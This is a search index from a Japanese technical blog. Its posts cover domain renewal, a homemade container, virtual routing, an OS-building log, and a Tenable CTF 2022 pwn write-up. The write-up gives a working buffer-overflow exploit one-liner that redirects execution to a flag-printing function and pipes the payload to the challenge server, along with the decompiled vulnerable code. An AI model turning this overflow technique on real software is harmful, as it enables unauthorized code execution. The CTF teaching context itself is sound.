'use strict';(function(){const b={cache:!0};b.doc={id:'id',field:['title','content'],store:['title','href','section']};const a=FlexSearch.create('balance',b);window.bookSearchIndex=a,a.add({id:0,href:'/posts/get_gcp_domain/',title:"Google Domainsで取得したドメインの更新",section:"Posts",content:"Google Domainsで取得したドメインの更新 #  2021年にGoogle Domainsで取得したドメインの有効期限が過ぎていたので，自分のブログサイトが閲覧できない状態になっていた． もちろんブログサイト自体は稼働し続けているため，ブラウザのURL欄にIPを打ち込めば閲覧することはできる． しかし，せっかく一度取得したドメインを失効したままにするのは格好が悪いため，ドメイン有効期限の更新を行う．\nGoogle Domainsでは,年額￥850から独自ドメインを取得することができる．(2022年3月時点)\n今回更新したドメインkazapps.infoでは，年額￥1,400（税別）であった． 独自ドメインの料金については，公式ページから検索することができる． Google Domains\n更新手順 #  更新手順は非常にシンプル.\n Googleからドメイン有効期限のお知らせメールが来ている場合  Googleから通知メールが来ている場合には，リンクをクリックすることで直接クレジットカード決済の画面に行くことができる． 今回は，1年間だけ有効期限を延長したいので，「年を追加」をクリックし，クレジットカード決済の確認を行う．\n  Google Domains管理ページから更新を行う場合  Google Domains管理ページの「マイドメイン\u0026gt;管理」ページにアクセスすると，次のような表示が出ている． 1年間だけ有効期限を延長したいので，「年を追加」からクレジットカード決済の画面に遷移する．\n 「年を追加」をクリックするとクレジットカード決済の画面に移動する． ブログサイトではサブドメイン (blog.kazapps.info) を利用しているため，DNSレコードの登録が必要だが， 今回は既に登録済みなので作業の必要はなかった． Google Domainsでは，有効期限が切れていても一定期間はドメインの設定を残してくれていたため助かった． ただし，一定期間が過ぎるとドメインは削除される．\n以下はGoogle Domainsからのメール通知の内容\n ドメインの更新は28日以内に行なってください．この期間を過ぎると，Googleのシステムからドメインが削除されます．\n 有効期限が過ぎた後の対応は以下のページにまとまっていた．\n  Google Domainsヘルプ: ドメイン登録の有効期限と削除  ざっくり次の様になっている\n   有効期限が切れてからの日数 状態     1-30日目 更新猶予期間．ドメイン登録の更新には追加料金はかからない．   31-60日目 ドメイン名の復元は可能だが，追加の料金がかかる   61日目 Googleに連絡がない場合，ドメインは削除．他の人が購入できる様になる．    "}),a.add({id:1,href:'/posts/mini-container/',title:"Linux namespaces+cgroupによる簡易コンテナの自作",section:"Posts",content:"Linux namespaces+cgroupによる簡易コンテナの自作 #  最近，仮想化技術 (VMM, NFV, コンテナ等) について勉強をはじめました． 仮想化に関連する技術の中でも，普段から開発，実験でよく利用しているDocker (コンテナ型仮想化) について，理解を深めるために，簡易なコンテナの実装を行いました． 今回実装する上で，参考にした記事がこちらです．\n 「【Go言語】自作コンテナ沼。スクラッチでミニDockerを作ろう - カミナシ開発者ブログ」\nコンテナを実現するために使用される基礎技術のみに絞って実装，解説を行なっており，コンテナ技術の本質部分を理解するための非常に良いチュートリアルだと感じました． これをきっかけに自作コンテナ沼にハマっていきたいと思います．\nGithubリポジトリ #  Golangで実装したコンテナ作成コマンドはこちらのGithubリポジトリで公開しています．\nhttps://github.com/takashimakazuki/mini-container\n実装した機能 #  簡易コンテナということで，実装した機能は非常に単純です． コンテナを作成し，作成したコンテナ内で指定したコマンドを実行するというものになります． プログラム内でやっていることは以下です．\n Linux namespace機能を用いた実行環境の隔離。つまりコンテナ化を行う。 chrootによってファイルシステムを分離 cgroupを使ってコンテナが使える計算リソースを制限する コンテナプロセス内でのコマンド実行  "}),a.add({id:2,href:'/posts/ovs/',title:"Open vSwitchとDocker でネットワークの勉強",section:"Posts",content:"Open vSwitch と Docker でネットワークの勉強 #  マスタリングTCP/IPを一通り読んだので，実際にIPv4ネットワークがどのように動作しているのか手を動かしながら確認したいと思いました． 本記事で作成するネットワークでは，仮想ルータ４台に手作業でルーティングテーブルを設定することで，それぞれに対してパケットを送受信できることを目指しました． 今回はルーティングテーブルの手動設定を初めて体験したいという軽い気持ちで始めたため，ルータ+L2スイッチの実機を用意することは考えずに，仮想環境で実行します．\n環境 #   Apple M1 Mac(ホストマシン) UTM: VM(仮想マシン)を立ち上げるソフトウェア  Linux上で動作検証したかったため   Ubuntu 18.04 Server Docker  CentOS7 on dockerのルーティングテーブルを用いてルーティングを行う   Open vSwitch  オープンソースの仮想スイッチソフトウェア    ネットワーク構成図 #  今回作成したいネットワーク構成図\n 静的ルーティングの設定 #  Dockerコンテナ内でルーティングテーブルの設定を行う．\nip route add [ネットワーク部の指定] via [転送先IPの指定] dev [デバイス名] docker exec router1 ip route add 10.0.3.0/24 via 10.0.1.2 dev eth0 # router1-\u0026gt;router4(10.0.3.2) docker exec router2 ip route add 10.0.4.0/24 via 10.0.3.2 dev eth1 # router2-\u0026gt;router3(10.0.4.1) docker exec router3 ip route add 10.0.1.0/24 via 10.0.2.1 dev eth0 # router3-\u0026gt;router2(10.0.1.2) docker exec router4 ip route add 10.0.2.0/24 via 10.0.4.1 dev eth1 # router4-\u0026gt;router1(10.0.2.1) docker exec router1 ip route add 10.0.4.0/24 via 10.0.2.2 dev eth1 docker exec router2 ip route add 10.0.2.0/24 via 10.0.1.1 dev eth0 docker exec router3 ip route add 10.0.3.0/24 via 10.0.4.2 dev eth1 docker exec router4 ip route add 10.0.1.0/24 via 10.0.3.1 dev eth0 Githubリポジトリ #  OVSのブリッジ作成スクリプトとDockerfile\nhttps://github.com/takashimakazuki/ovs-network\n詰まった点 #   vyOSを使いたかったがARMマシンに対応したDockerコンテナの作成方法がわからなかったため断念→CentOSのコンテナを利用 CentOSをルータとして動作させるためにip_forward機能を有効にする必要があった  docker run --sysctl net.ipv4.ip_forward=1    "}),a.add({id:3,href:'/posts/kos-01-07/',title:"OS自作本　進捗0x01",section:"Posts",content:"ゼロからのOS自作入門　作業記録 #  内田公太氏の「ゼロからのOS自作入門」でのOS作成作業を記録として記す。\n2/28 第1章 #  開発環境の構築\n自作OSの開発に利用した環境\n ThinkCentre M720s Small Ubuntu 20.04 Focal Fossa  動作確認は、仮想マシンのqemuを使用する。 BOOTX64.EFIというファイルにバイナリを打ち込んで、起動する。gitに完成済みのEFIファイルがあるが、初めての作業なのでoctetaで一つずつ１６進数を打ち込むことにした。 qemuで「Hello, workd」を表示できた。\n C言語で同じ動作をするEFIファイルを作成する。 Cプログラム→（コンパイラ clang）→オブジェクトファイル→ (リンカ lld-link) → EFIファイル(hello.efi)\n3/1　第2章 #  EDKⅡを利用してアプリケーション開発ができるようにする。 まずはEDKでのハローワールドから始める。\nEDKⅡ：UEFI BIOS上で動作するアプリケーション開発キット\n２章を読んだのみで実装は進まなかった。\n3/4 第2章 #  EDKでハローワールド KosLoaderPkg/以下にLoad.inf, Main.c, KosLoaderPkg.dec, KosLoaderPkg.decの４ファイルを作成し、EDKを用いてビルドを行う →Loader.efiが生成されるため、これをBOOTX64.EFIとして保存する。(run_qemu.shで実行できる)\n実行結果：edkでハローワールド(めっちゃ誤字している) 今後このアプリケーションをブートローダとして拡張していく\nまずはメモリマップの取得を行う。\nedkで用意されている機能gBS-\u0026gt;GetMemoryMapを使用する。\nEFI_STATUS GetMemoryMap( IN OUT UINTN *MemoryMapSize, IN OUT EFI_MEMORY_DSCRIPTOR *Memorymap, OUT UINTN *MapKey, OUT UINTN *DescriptorSize, OUT UINT32 *DescriptorVersion );  MemoryMapSize：MemoryMapのバッファサイズ（出力は実際のメモリサイズ） MemoryMap: メモリマップ書き込み先のメモリ領域の先頭ポインタ MapKey：メモリマップを識別するための値を書き込む変数を指定する DescriptorSize: メモリマップの個々の行を表すメモリディスクリプタのバイト数 DescriptorVersion: メモリディスクリプタ構造体のバージョン番号（使用しない）  メモリマップの読み込み成功。下図はメモリディスクリプタの各要素csvファイルとして出力している。 memorymap\nIndex, Type, Type(name), PhysicalStart, NumberOfPages, Attribute 0, 3, EfiBootServicesCode, 00000000, 1, F 1, 7, EfiConventionalMemory, 00001000, 9F, F 2, 7, EfiConventionalMemory, 00100000, 700, F 3, A, EfiACPIMemoryNVS, 00800000, 8, F 4, 7, EfiConventionalMemory, 00808000, 8, F 5, A, EfiACPIMemoryNVS, 00810000, F0, F 6, 4, EfiBootServicesData, 00900000, B00, F 7, 7, EfiConventionalMemory, 01400000, 3AB36, F ... 第二章おわり！\n3/5 第3章 #  第３章レジスタ\nQEMUモニタの使い方(GDBと同じか？) wikibooks\n  info registers\n  x/2i 0x067ae4c4\n  初めてのkernel作成\n  ブートローダとkernelは別ファイルとして開発する\n  カーネルのコンパイル時にエラーが出た\n  # kernel/main.cpp のコンパイル ~/kos/kernel$ clang++ -O2 -Wall --target=X86_64-elf -ffreestanding -mno-red-zone -fno-exceptions -fno-rtti -std=c++17 -c main.cpp clang: warning: argument unused during compilation: \u0026#39;-mno-red-zone\u0026#39; [-Wunused-command-line-argument] error: unknown target triple \u0026#39;X86_64---elf\u0026#39;, please use -triple or -arch  --targetフラグなしでコンパイルを実行して解決 コンパイラがmain.oを生成する 次にリンカを実行して、main.oから実行可能ファイル(elf)を作成する  ~/kos/kernel$ ld.lld --entry KernelMain -z norelro --image-base 0x100000 --static -o kernel.elf main.o main.cpp -\u0026gt; (clang++でコンパイル) -\u0026gt; main.o -\u0026gt; (ld.lldでリンク) -\u0026gt; kernel.elf  次に、ブートローダを拡張してカーネルファイルを読み込む機能を追加する 謎のオフセット24バイト（下記コード） → ELFの仕様で、64bit用のEFLのエントリポイントアドレスは、オフセット24バイトの位置から8バイト整数で書かれている。  // Boot kernel  UINT64 entry_addr = *(UINT64*)(kernel_base_addr + 24); typedef void EntryPointType(void); EntryPointType* entry_point = (EntryPointType*)entry_addr; entry_point();   kernelのロード＋起動成功   画面の色をいじっていく\n  まずはブートローダでピクセルを描く(UEFIのGOP機能)\n  openProtocol関数でgopを取得する\n  gBS-\u0026gt;OpenProtocol( gop_handles[0], \u0026amp;gEfiGraphicsOutputProtocolGuid, (VOID**)gop, image_handle, NULL, EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL ); UEFIでピクセル色指定をした結果  次にカーネルでピクセルを描く+エラー処理 gBSの各関数の戻り値(EFI_STATUS型)をチェックしてエラーの場合には、メッセージ表示＋hltを行う。   3/8 第4章 #  第４章 make入門\n kernelのコード (main.cpp) にピクセルを描画する処理を追加する。 なぜか黄色が表示される。。。    原因はフレームバッファにred要素を書いていなかったことだった。p[2] = c.rの記述がない。  // main.cpp WritePixel関数内 } else if (config.pixel_format == kPixelBGRResv8BitPerColor) { uint8_t* p = \u0026amp;config.frame_buffer[4 * pixel_position]; p[0] = c.b; p[1] = c.g; } else {   これでピクセルの描画を楽に記述できるようになった。\n  カーネルローダの改良\n カーネルの読み込み処理で、メモリ上に確保するメモリサイズを計算する処理が実は間違っているので修正する必要がある。 kernel.elfの情報 (ELFプログラムヘッダのLOAD部分) を見て、正しいサイズのメモリを確保するように修正する。    上記について書き換えたが、なぜか以下のエラーが出てkernelが実行されない。\n  failed to allocate pages: Not Found  原因：上記は取得しようとしているページ数が大きすぎたことで発生したエラー  num_pagesの計算で、カーネルのサイズに0xfffを乗算しているのがミス（以下のコード部分） 本来は、カーネルのサイズに0xfffを加算する ちなみに、この部分はカーネルをメモリ上に配置するために、カーネルサイズをページ単位(0x1000)で計算している。0xfffを加算する理由は、カーネルサイズを0x1000で割った際に必要なページ数を正しく計算するため。つまり以下を計算するためである。 カーネルの配置に必要なページ数 = ceil(カーネルサイズ(bytes) / 0x1000)    // 誤→\u0026#34;* 0xfff\u0026#34; // 正→\u0026#34;+ 0xfff\u0026#34; // UINTN num_pages = (kernel_last_addr - kernel_first_addr * 0xfff) / 0x1000; status = gBS-\u0026gt;AllocatePages( AllocateAddress, EfiLoaderData, num_pages, \u0026amp;kernel_first_addr ); 3/9 第5章 #  第５章　文字表示とコンソールクラス\n  ピクセルの描画はできるようになっているので、それを用いて文字を描画する   参照とポインタの使い分け\n ポインタ：C言語からある機能。nullptrとか書くだけで簡単にNULLポインタを作成できる。 参照：C++で追加された機能。NULL参照が作りにくい。引数で参照を指定することでNULLではないものを渡してほしいという意思表示として使える。    フォントのファイルをカーネルファイルに組み込む\n  ELFなどではないバイナリも、実行可能ファイルにリンクしてプログラムから変数として見えるようにすることができる。これは知らなかったためかなり勉強になった。\n  // hankaku.bin(フラットバイナリ)→hankaku.o(ELFオブジェクトファイル) $ objcopy -I binary -O elf64-x86-64 -B i386:x86-64 hankaku.bin hankaku.o $ file hankaku.o hankaku.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped   ASCII文字列を一通り利用できるようになった。   文字の折返し、スクロールなどを行うconsoleクラスの実装　完了   3/11 第6章 #  第6章 マウス入力とPCIe\n UIのアップデート。背景に色をつけ、画面下にタスクバーを模した長方形を描画することでそれらしい見た目になった。 ホストマシン (ubuntu) を再起動すると、環境変数がリセットされたことでkernelをビルドするためのmakeコマンドが失敗した。 起動時に環境変数が自動で設定されるように、$HOME/.bashrcに下記を追記する  # .bashrc source $HOME/osbook/devenv/buildenv.sh   USBホストドライバを実装する\n  USB (Universal Serial Bus)　←地味に知らなかった\n  ドライバの実装がどんなのものなのか知らなかったので、何よりもこの章が楽しみだった。\n  →ドライバの実装には解説はないらしい。残念。\n  PCIデバイスの読み取り\n  IOアドレス空間：メモリアドレス空間とは別のアドレス空間。周辺機器用のアドレス空間。\n  PCIコンフィグレーション空間（周辺機器にある）にアクセスするためにIOアドレス空間を利用する。\n  ScanAllBus関数では、PCIデバイスをすべて探索している\n  bus=0, device=0, function=0から検索する\n device: 1つのバスに最大32個まで function: 1つのデバイスに最大8個まで    なぜfunctionで探索している？\n  PCIファンクションがPCI-to-PCIブリッジ（２つのPCIバスをつなぐブリッジ）である場合、ブリッジの下流側のバスに対して、PCIデバイスを探索する。\n  PCI-to-PCIブリッジは、PCIデバイスの最大接続数を増やすために利用される。\n  Error ScanAllBus() { ... for (uint8_t function = 1; function \u0026lt; 8; ++function) { if (ReadVendorId(0, 0, function) == 0xffffu) { continue; } // ScanBusの引数はbus番号のはずだが、function番号として1-8を引数に入れている。なぜ？  if (auto err = ScanBus(function)) { return err; } } return Error::kSuccess; }  PCIデバイスの探索+表示に成功     ポーリングでマウス入力を読み取る\n  6.4節のコードをビルドする際にエラーが発生した。\n  エラーの要点と思われる箇所はこちら：ld.lld: error: cundefined symbol: _exit\n   $ make ld.lld -L/home/user/osbook/devenv/x86_64-elf/lib --entry KernelMain -z norelro --image-base 0x100000 --static -o kernel.elf main.o graphics.o mouse.o font.o hankaku.o newlib_support.o console.o pci.o asmfunc.o libcxx_support.o logger.o usb/memory.o usb/device.o usb/xhci/ring.o usb/xhci/trb.o usb/xhci/xhci.o usb/xhci/port.o usb/xhci/device.o usb/xhci/devmgr.o usb/xhci/registers.o usb/classdriver/base.o usb/classdriver/hid.o usb/classdriver/keyboard.o usb/classdriver/mouse.o -lc -lc++ ld.lld: error: cundefined symbol: _exit \u0026gt;\u0026gt;\u0026gt; referenced by abort.c \u0026gt;\u0026gt;\u0026gt; lib_a-abort.o:(abort) in archive /home/user/osbook/devenv/x86_64-elf/lib/libc.a ld.lld: error: undefined symbol: kill \u0026gt;\u0026gt;\u0026gt; referenced by signalr.c \u0026gt;\u0026gt;\u0026gt; lib_a-signalr.o:(_kill_r) in archive /home/user/osbook/devenv/x86_64-elf/lib/libc.a ld.lld: error: undefined symbol: getpid \u0026gt;\u0026gt;\u0026gt; referenced by signalr.c \u0026gt;\u0026gt;\u0026gt; lib_a-signalr.o:(_getpid_r) in archive /home/user/osbook/devenv/x86_64-elf/lib/libc.a make: *** [Makefile:25: kernel.elf] Error 1   newlib_support.cにライブラリ関数を追加するのを忘れていた。みかん本に挑戦している別の方の ページの記述から気づくことができた。\n  カーソルを動かすことに成功した。デバッグにかなり長い時間(4時間ほど)かかってしまった。。   3/18 第7章 #  第7章 割り込みハンドラ\n 特殊なアドレス空間  アドレス空間の中には、メインメモリに配置されている領域だけではなく、CPUレジスタに領域が配置されている範囲もある。 0xfee00000から0xfee00400までのアドレス (1024バイト) は、メインメモリではなくCPUのレジスタに配置されている。　 特に0xfee000b0番地への書き込みを行うことで、割り込み処理の終了をCPUに伝えることができる。   C++の記法  __attribute__((interrupt))修飾子：割り込みハンドラであることを伝える。これがついている関数には、コンパイル時にコンテキストの保存と復帰処理が挿入される。 __attribute__((packed))修飾子：コンパイラは本来自動で変数のアラインメントを行うが、これがついている変数に対しては、変数のアラインメントを行わない。 reinterpret_cast\u0026lt;型\u0026gt;：ポインタ型もしくは整数型(int, longなど)を、任意の型のポインタに変換する。 参考あくまでコンパイラに型情報を伝えるためなので、生成されるコードは普通変わらない。    union InterruptDescriptorAttribute { // このdata変数は、bits変数のサイズ(16bit)をコンパイラに伝えるためだけに宣言している  // 実際には使用しない  uint16_t data; struct { uint16_t interrupt_stack_table : 3; uint16_t : 5; DescriptorType type : 4; uint16_t : 1; uint16_t descriptor_privilege_level : 2; uint16_t present : 1; } __attribute__((packed)) bits; // 16bitのメモリ領域を[3bit, 5bit, 4bit, 1bit, 2bit, 1bit]に分けてアクセスすることができる } __attribute__((packed)); // アラインメントを行わない "}),a.add({id:4,href:'/posts/tenable-pwnable/',title:"Tenable CTF 2022 Writeup 'Olden Ring'[pwn]",section:"Posts",content:"Tenable CTF 2022 Writeup \u0026lsquo;Olden Ring\u0026rsquo;[pwn] #  この記事では，CTF (Capture the Flag) オンライン大会の Tenable CTF 2022で取り組んだ問題の解説をおこないます．\nTenable CTFには，研究室のメンバー3名でチームを作って挑戦しました． 私が取り組んだ問題は，pwnの\u0026rsquo;Olden Ring\u0026rsquo;です． ポイントは100ptsと一番低い分類にあたるので，pwn初心者問題だと思われます．\n問題 #  netcatで接続するためのリモートサーバのIP,ポート番号の情報と，oldenというファイルが添付されている．\nfileコマンドでファイルの内容を調べたところ，64bitのELFバイナリファイルであることはわかりました．\n解説 #  ファイルを実行してみる（または，netcatでリモートサーバに接続してみる）と，どうやらコマンドラインのゲームらしいです．（問題名から察するに，ELDEN RING風のゲームなのかも？？） いくつかの説明文とともに，コマンドラインで入力が求められるというものでした．\nバイナリファイルをGhidraを使ってデコンパイルした結果，main関数の他にdefeat_frog_guys関数，boss_fight関数があることがわかります．\nその他の関数として，どの関数からも呼び出されていないzip_to_end関数があり，flag.txtの内容を出力する処理を行なっています． つまり，最終的にこの関数を実行することができれば，フラグを取得できるはず．\n脆弱性を探す上で，ユーザからの入力を受け付けている関数の使い方に誤りがないかをチェックしていきました． すると，fgets関数がバッファサイズを指定して使われていることがわかります．ユーザ入力の格納先はlocal_418 (Ghidraのデコンパイル時に自動生成された変数名) という変数でした．\nfgets((char *)\u0026amp;local_418, 0x400, stdin); 変数local_418はローカル変数なので，BOFできればmain関数のreturnアドレス書き換えが可能です． しかし，どうやらこの変数local_418のバッファサイズは0x400はあるようで，fgetsによってBOFできそうには見えませんでした．\nmain関数内で，変数local_418から0x400バイト分0で埋めることによって初期化しているため，バッファサイズが0x400バイトあることは想定されているようです．\nmemset(\u0026amp;local_418, 0, 0x400); 変数local_418が利用されている箇所を中心に，他の処理をチェックしてみます．\ndefeat_frog_guysという関数の引数として変数local_418 (ユーザ文字列のバッファ) が利用されているため，\n// local_418が利用されている！ defeat_frog_guys(\u0026amp;local_418, local_14); このdefeat_frog_guys関数では，memcpy等を用いて，データのコピーが行われているようでした． コピーの流れが複雑なため，ソースコードから挙動を理解するのに時間がかかると判断したため，ここからはGDBによってプログラムを実行させながら挙動を把握していきました．\nユーザが入力した文字列は，defeat_frog_guys関数のスタックフレーム内にコピーされているようでした． そこで，ためしに\u0026rsquo;AAAAA\u0026hellip;\u0026lsquo;という長さ0x400の文字列を入力したところ，Segmentation faultが発生し，BOFが発生したことを確認できました！ defeat_frog_guys関数のスタックがBOF可能ということがわかったので，あとはdefeat_frog_guys→mainに戻る際のreturnアドレスを書き換えて，zip_to_end関数の先頭アドレスにすれば完了です．\n zip_to_end関数のアドレス：0x4012b6（ASLR，PIE等のセキュリティ機構はオフになっているのでアドレスは固定でした） returnアドレス書き換えのためのパディングの長さ：0x3f3バイト ２回目のfgetsで入力する数値：199  ２回目のfgetsで入力する数値によって，コピーされる場所が何バイトかずれたりするようで，上記の2と3については， 何度か入力する数値，パディングの長さを変えてGDBを実行しました． GDBではプログラム実行中にブレークポイントを設置して，プログラムのある時点でのスタックの内容を表示することができるため，この機能を使うことでパディングの長さを調整しました． 使用したGDBのコマンドは主に以下のようなものです．\n// ブレークポイントを設置する (gdb) break 0x400000 // 現在のスタックtopから40x8バイト分のデータを表示する． (gdb) x/40gx $rsp 最終的に，以下のコマンドを実行することでexploitコードが出力されます． これをリモートサーバのプログラムの入力として与えることでフラグが手に入ります．\npython3 -c \u0026quot;print('A' * 0x3f3 + '\\xb6\\x12\\x40\\x00\\x00\\x00\\x00\\x00' + '199')\u0026quot; | nc xxx.xxx.xxx.xxx 8000 所感 #  久しぶりに参加したため，脆弱性の探し方，GDB等のツールの使い方を思い出すという作業から始まりました． 定期的に手を動かして問題を解かないとすぐ忘れていくものだなと痛感しました． これからチームメンバーも増やして定期的にCTF大会に参加したいと思っています．\n配布されたバイナリのデコンパイル結果 #  Ghidraを使って，C言語のソースコードにデコンパイルした結果です． 主要な関数のみを記載しています．\nundefined8 main(void) { long lVar1; undefined8 *puVar2; char local_420[8]; undefined8 local_418; undefined8 local_410; undefined8 local_408[126]; uint local_14; ulong local_10; local_10 = 0; local_418 = 0; local_410 = 0; puVar2 = local_408; for (lVar1 = 0x7e; lVar1 != 0; lVar1 = lVar1 + -1) { *puVar2 = 0; puVar2 = puVar2 + 1; } memset(\u0026amp;local_418, 0, 0x400); printf(\u0026#34;\\x1b[0;33m\u0026#34;); printf(\u0026amp;DAT_00402488); printf(\u0026#34;\\x1b[0m\u0026#34;); putchar(10); puts( \u0026#34;\\n\\nYou are on your way to becoming the Olden Lord, but first you must collect rings by defea ting many (many many) frog-guys!\u0026#34;); printf(\u0026#34;The rings will let you become powerful enough to face the final boss!\u0026#34;); printf(\u0026#34;\\n\\nFirst things first: What\\\u0026#39;s your name?\\n\u0026gt; \u0026#34;); fgets((char *)\u0026amp;local_418, 0x400, stdin); puts(\u0026amp;DAT_00402ca0); puts(\u0026#34;--------------------\\nFig a. A Frog-guy\\n--------------------\u0026#34;); while (local_10 \u0026lt; 5000) { printf(\u0026#34;\\n\\n=============================================================================\u0026#34;); puts( \u0026#34;\\n\\nFrom atop a hill, overlooking a lake of red, you see a field of 250 frog-guys just kind a hanging out, not bothering anyone.\u0026#34;); printf(\u0026#34;How many do you defeat to gather their rings?\\n\\n\u0026gt; \u0026#34;); fgets(local_420, 8, stdin); local_14 = atoi(local_420); if ((int)local_14 \u0026lt; 0) { printf(\u0026#34;\\nYou...create? frog-guys? Don\\\u0026#39;t do that\u0026#34;); } else if (local_14 == 0) { puts(\u0026#34;\\nYou spare all the frog-guys. Admirable.\u0026#34;); } else if ((int)local_14 \u0026lt; 0xfb) { printf(\u0026#34;\\nYou set about your noble work of defeating %d nearly-defenseless, chillin\\\u0026#39;frog-guy s\\n\\n\u0026#34;, (ulong)local_14); defeat_frog_guys(\u0026amp;local_418, local_14); puts(\u0026#34;\\n\\nYou rest to allow some frog-guys to reconvene.\u0026#34;); local_10 = local_10 + (long)(int)local_14; } else if (0xfa \u0026lt; (int)local_14) { puts(\u0026#34;\\nWhoa now, we know you\\\u0026#39;re excited, but there aren\\\u0026#39;t that many in this field.\u0026#34;); } } boss_fight(); return 0; } void defeat_frog_guys(void *param_1, int param_2) { void *__src; int iVar1; size_t sVar2; long lVar3; undefined **ppuVar4; undefined8 *puVar5; void **ppvVar6; byte bVar7; void *local_b48[100]; undefined8 local_828; undefined8 local_820; undefined8 local_818[255]; int local_1c; bVar7 = 0; local_828 = 0; local_820 = 0; puVar5 = local_818; for (lVar3 = 0xfe; lVar3 != 0; lVar3 = lVar3 + -1) { *puVar5 = 0; puVar5 = puVar5 + 1; } memset(\u0026amp;local_828, 0, 0x400); ppuVar4 = \u0026amp;PTR_DAT_0040d0a0; ppvVar6 = local_b48; for (lVar3 = 100; lVar3 != 0; lVar3 = lVar3 + -1) { *ppvVar6 = *ppuVar4; ppuVar4 = ppuVar4 + (ulong)bVar7 * -2 + 1; ppvVar6 = ppvVar6 + (ulong)bVar7 * -2 + 1; } sVar2 = strlen((char *)\u0026amp;local_828); memcpy((void *)((long)\u0026amp;local_828 + sVar2), \u0026#34;You defeat the following frog-guys:\u0026#34;, 0x24); for (local_1c = 0; local_1c \u0026lt; param_2; local_1c = local_1c + 1) { iVar1 = rand(); __src = local_b48[iVar1 % 99]; sVar2 = strlen((char *)\u0026amp;local_828); memcpy((void *)((long)\u0026amp;local_828 + sVar2), __src, 5); sVar2 = strlen((char *)\u0026amp;local_828); memcpy((void *)((long)\u0026amp;local_828 + sVar2), \u0026amp;DAT_00402444, 2); } sVar2 = strlen((char *)\u0026amp;local_828); memcpy((void *)((long)\u0026amp;local_828 + sVar2), \u0026#34;\\n\\nFrog-guys across the land will fear the name \u0026#34;, 0x32); sVar2 = strlen((char *)\u0026amp;local_828); memcpy((void *)((long)\u0026amp;local_828 + sVar2), param_1, 0x400); printf(\u0026#34;%s\u0026#34;, \u0026amp;local_828); return; } void boss_fight(void) { puts(\u0026#34;\\nDang, you must be like...really really powerful. Ok, you uh...how\\\u0026#39;d you get here?\u0026#34;); puts( \u0026#34;You try to fight the boss, but your build has been nerfed in a patch, and you get one-shotted almost instantly.\u0026#34;); printf(\u0026#34;You die. Enjoy fighting your way here again.\u0026#34;); /* WARNING: Subroutine does not return */ exit(0); } // zip_to_end関数の先頭アドレス：0x00000000004012b6 void zip_to_end(void) { int iVar1; char local_128[272]; FILE *local_18; char local_9; puts(\u0026#34;\\nYou do some weird thing by blocking and timing frames!!!\\n\u0026#34;); puts( \u0026#34;\\nYou arrive at the secret final boss!\\nQuick! Choose your tactic to defeat it before being o ne-shotted!\\n\u0026#34;); puts(\u0026#34;\\n1) FROSTY STOMP!!!\\n2) FROSTY STOMP!!!\\n3) FROSTY STOMP!!!\\n\u0026gt;\\n\u0026#34;); fgets(local_128, 0x102, stdin); puts(\u0026#34;\\nGood Strategy!!! You win! You\\\u0026#39;re now the Olden Lord!\\n\u0026#34;); local_18 = fopen(\u0026#34;/home/ctf/flag.txt\u0026#34;, \u0026#34;r\u0026#34;); if (local_18 != (FILE *)0x0) { while (local_9 != -1) { putchar((int)local_9); iVar1 = fgetc(local_18); local_9 = (char)iVar1; } fclose(local_18); } /* WARNING: Subroutine does not return */ exit(0); } "})})()